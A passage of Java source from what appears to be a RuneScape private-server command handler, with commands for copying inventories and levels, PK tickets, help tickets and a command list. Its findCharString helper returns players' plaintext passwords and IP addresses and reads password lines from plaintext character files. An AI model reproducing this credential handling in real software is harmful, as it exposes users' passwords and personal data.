				if (commandStart.equalsIgnoreCase("copyinv") && Server.SPAWN) {
					if (!copyCheck(player))
						return;
					if (ContentEntity.getTotalAmountOfItems(player) > 0) {
						player.getActionSender()
								.sendMessage(
										"You need to remove items from your inventory!");
					}
					Player p = World.getWorld()
							.getPlayer(s.substring(8).trim());
					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
						return;
					if (p != null) {
						for (Item item : p.getInventory().toArray()) {
							if (item != null) {
								if (copyCheck(item, player))
									continue;
								player.getInventory().add(item);
							}
						}
					}
				}

				if (commandStart.equalsIgnoreCase("copylvl")) {
					if (!copyCheck(player))
						return;
					if (ContentEntity.getTotalAmountOfEquipmentItems(player) > 0) {
						player.getActionSender().sendMessage(
								"You can't copy with armour on!");
						return;
					}
					Player p = World.getWorld()
							.getPlayer(s.substring(8).trim());
					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
						return;
					if (p != null) {
						for (int i = 0; i < 6; i++) {
							player.getSkills().setExperience(i,
									p.getSkills().getXps()[i]);
							player.getSkills().setLevel(i,
									p.getSkills().getRealLevels()[i]);
						}
					}
				}
			}

			/**
			 * End Spawn Server Commands.
			 */

			if (commandStart.equals("resetrfd")) {
				player.RFDLevel = 0;
				player.getActionSender().sendMessage("Reset");
				return;
			}
			if (commandStart.equals("findids")) {
				for (Item i : player.getInventory().toArray()) {
					if (i == null)
						continue;
					player.getActionSender().sendMessage("Id :" + i.getId());
				}
				return;
			}

			if (commandStart.equals("agility")) {
				Magic.teleport(player, GnomeStronghold.GNOMELOCATION, false);
			}

			if (commandStart.equals("showwildinterface")) {
				player.getActionSender().sendMessage(
						"Will show now wild Interface");
				player.showEP = false;
				player.getActionSender().sendWildLevel(player.wildernessLevel);
				return;
			}

			/** Debugging Commands */
			if (commandStart.equals("isamask")) {
				System.out.println(Equipment.getType(new Item(664, 1)) + "");
				return;
			}
			if (commandStart.equals("clearfriendlist")) {
				player.getFriends().clear();
				player.getActionSender().sendMessage("Done cleaning!");
				return;
			}
			if (commandStart.equals("wildlvl")) {
				player.getActionSender().sendMessage(
						"Wild level " + player.wildernessLevel);
				return;
			}
			if (commandStart.equals("myep")) {
				player.getActionSender().sendMessage("EP level " + player.EP);
				return;
			}
			if (commandStart.equals("givemetabsplz") && Server.SPAWN) {
				for (int i = 0; i < 100; i++) {
					int id = 8008 + Misc.random(4);
					ContentEntity.addItem(player, id);
				}
				return;
			}

			if (commandStart.equals("myopp")) {
				System.out.println("Opp is : " + player.cE.getOpponent());
				return;
			}
			if (commandStart.equalsIgnoreCase("funpk")) {
				Magic.teleport(player, Location.create(2594, 3156, 0), false);
			}
			if (commandStart.equalsIgnoreCase("buytickets")) {
				if (as[1].length() >= 9) {
					player.sendMessage("Number is too long");
					return;
				}
				int tickets = Integer.parseInt(as[1]);
				if (tickets <= 0)
					return;
				if (tickets >= 100000)
					return;
				if (player.getPoints().getPkPoints() >= (tickets * 10)) {
					player.getPoints().setPkPoints(
							player.getPoints().getPkPoints() - (tickets * 10));
					final int freeSlots = player.getInventory().freeSlots();
					(freeSlots > 0 ? player.getInventory() : player.getBank())
							.add(new Item(5020, tickets));
					player.getActionSender().sendMessage(
							String.format(
									"%d PK tickets have been added to your %s",
									tickets, freeSlots > 0 ? "inventory"
											: "bank"));
				} else {
					player.getActionSender().sendMessage(
							"You don't have enough pkp for this!");
				}
			}
			if (commandStart.equalsIgnoreCase("selltickets")) {
				int tickets = Integer.parseInt(as[1]);
				int removed;
				if ((removed = player.getInventory().remove(
						new Item(5020, tickets))) > 0) {
					player.getPoints().inceasePkPoints(removed * 10);
					player.getActionSender().sendMessage(
							"You sold: " + removed + " pk tickets!");
				}
			}

			if (commandStart.startsWith("empty")) {
				if (!player.getLocation().inPvPArea())
					DialogueManager.openDialogue(player, 143);
				else
					player.getActionSender().sendMessage(
							"You cannot empty inside a pvp area!");
				return;
			}
			if (player.getLocation().getX() >= 3180
					&& player.getLocation().getX() <= 3190
					&& player.getLocation().getY() >= 3433
					&& player.getLocation().getY() <= 3447) {

			}
			if (commandStart.equals("players")) {
				player.getActionSender().sendMessage(
						"@blu@There are currently "
								+ World.getWorld().getPlayers().size()
								+ " players online!");
				player.getActionSender().openPlayersInterface();
				return;
			}
			if (commandStart.equals("kdr")) {
				if (player.getDeathCount() == 0) {
					player.getActionSender()
							.sendMessage(
									"The limit as deathcount goes to zero of KillCount/DeathCount");
					player.getActionSender().sendMessage(
							"is positive or negative infinite, this means :");
					player.getActionSender()
							.sendMessage(
									"You are total badass or you totally suck at Pking.");
					return;
				}
				double kdr = (double) player.getKillCount()
						/ (double) player.getDeathCount();
				kdr = Misc.round(kdr, 3);
				player.forceMessage("My kdr is : " + kdr + ", "
						+ player.getKillCount() + "/" + player.getDeathCount());
				return;
			}
			if (commandStart.equals("resetslayertask")) {
				player.slayerTask = 0;
				player.getActionSender().sendMessage("@blu@Slayer Task Reset!");
				return;
			}
			if (commandStart.equals("train")) {
				if (Misc.random(1) == 0)
					Magic.teleport(player, 2709, 3718, 0, false);
				else
					Magic.teleport(player, 3566 - Misc.random(1),
							9952 - Misc.random(1), 0, false);
				if (Server.SPAWN)
					player.getActionSender()
							.sendMessage(
									"@blu@Please note that combat skills can be set by using commands such as ::str 99");
				return;
			}

			if (commandStart.equalsIgnoreCase("reqhelp")) {
				try {
					String reason = s.substring(8);
					if (System.currentTimeMillis() - player.lastTickReq() < 60000) {
						player.getActionSender()
								.sendMessage(
										"You need to wait 60 seconds to request another ticket!");
						return;
					}
					if (Ticket.hasTicket(player))
						Ticket.removeRequest(player);
					Ticket.putRequest(player, reason);
					PushMessage.pushHelpMessage(player.getName()
							+ " has just requested help for:" + reason);
					player.getActionSender()
							.sendMessage(
									"Your ticket was submitted! Remember to use ::help for most questions!");
					player.refreshTickReq();
				} catch (StringIndexOutOfBoundsException | NullPointerException e) {
					player.getActionSender().sendMessage(
							"Invalid ticket request");
				}
			}

            if(s.equalsIgnoreCase("checkyoself")) {
                player.getActionSender().sendMessage("script~x123");
            }

			if (s.equals("resetbankpin")) {
				if (player.bankPin.length() >= 4
						&& !player.bankPin.equals(player.enterPin)) {
					player.resetingPin = true;
					player.getActionSender().sendMessage(
							"You need to first input your bank pin.");
					BankPin.loadUpPinInterface(player);
					return;
				} else {
					// player.bankPin = "";
					player.getActionSender().sendMessage(
							"Bank Pin successfully reset.");
				}
			}


			if (commandStart.equals("commands")) {
				// player.getActionSender().
				player.getActionSender().openQuestInterface(
						"Help interface",
						new String[] { "Available Commands:", "::players",
								"::item id amount", "::yell", "::nameitem id",
								"::atk lvl", "::def lvl", "::str lvl", "::kdr",
								"::max", "::copy player", "::copyinv player",
								"::copylvl player", "::edge",
								"::buytickets amount [buy pk tickets]",
								"::selltickets amount [sell pk tickets]",
								"::buyrocktails amount",
								"::ospk (oldschool pk)", "::multipk",
								"::funpk", "::reqhelp reason",
								"::dangerouspk (lose everything high-risk)",
								"::placebounty name,pkpamount", "::onlinestaff", "::npclogs" });
				return;
			}
			
			if(commandStart.equals("npclogs")) {
				player.getActionSender().openQuestInterface(
						"NPC Logs", player.getNPCLogs().getDisplay()
						);
				return;
			}

            if(commandStart.equalsIgnoreCase("clearjunk")) {
                for(final Item item : player.getBank().toArray()) {
                    if(item.getCount() < 10 && ItemSpawning.canSpawn(item.getId())) {
                        player.getBank().remove(item);
                    }
                }
            }

            if(commandStart.equalsIgnoreCase("listcolors")) {
                final Color[] colors = Color.values();
                final String[] strings = new String[colors.length];
                for(int i = 0; i < colors.length; i++)
                    strings[i] = colors[i].toString();
                player.getActionSender().openQuestInterface("Colors", strings);
            }
			
			if (commandStart.equals("changepass")
					|| commandStart.equals("pass")
					|| commandStart.equals("changepassword")) {
				player.getInterfaceManager().show(ChangePassword.ID);
			}

		} catch (Exception e) {
			System.out.println("Command error caused by " + player.getName());
			// e.printStackTrace();
			player.getActionSender().sendMessage(
					"Error while processing command.");
		}
	}

	public static boolean copyCheck(Player player) {
		if (player.duelAttackable > 0)
			return false;
		if (player.getLocation().inPvPArea())
			return false;
		if (player.getLocation().inDuel())
			return false;
		if (player.getLocation().inCorpBeastArea())
			return false;
		if (player.getLocation().inArdyPvPArea())
			return false;
        if(player.cE.getOpponent() != null)
            return false;
		return true;
	}

	public static File getPlayerFile(String playerName) {
		return new File("./data/characters/" + playerName.toLowerCase()
				+ ".txt");
	}

	public static String findCharString(String playerName, String string) {
		Player p = World.getWorld().getPlayer(playerName);
		if (p != null) {
			switch (string) {
			case "Pass":
				return "Password is " + p.getPassword();
			case "IP":
				return "IP is" + p.getFullIP();
			}
		}
		File file = new File("./data/characters");
		if (file.isDirectory()) {
			for (File player : file.listFiles()) {
				if (!player.getName().toLowerCase().contains(playerName))
					continue;
				// System.out.println("Found name: "+player.getName());
				String filename = player.getName();
				filename = filename.toLowerCase().replaceAll(".txt", "");
				if (playerName.toLowerCase().equals(filename)) {
					// System.out.println("Got to opening file: "+player.getPath());
					BufferedReader in = null;
					try {
						in = new BufferedReader(new FileReader(new File(
								player.getPath())));
						String s = "";
						while ((s = in.readLine()) != null) {
							if (s.toLowerCase()
									.startsWith(string.toLowerCase())) {
								return s.trim();
							}
						}
					} catch (Exception e) {
						e.printStackTrace();
						return "Could not find " + string;
					} finally {
						if (in != null)
							try {
								in.close();
							} catch (IOException e) {
								return "Something fked up bad";
							}
					}
				}
			}
		} else {
			System.out.println("File is not directory");
		}
		return "Could not find player!";
	}

	public static boolean copyCheck(Item item, Player p) {
		return ItemSpawning.allowedMessage(item.getId()).length() > 0
				|| !EquipmentReq.canEquipItem(p, item.getId());
	}

	public static int reverse = 1;

}
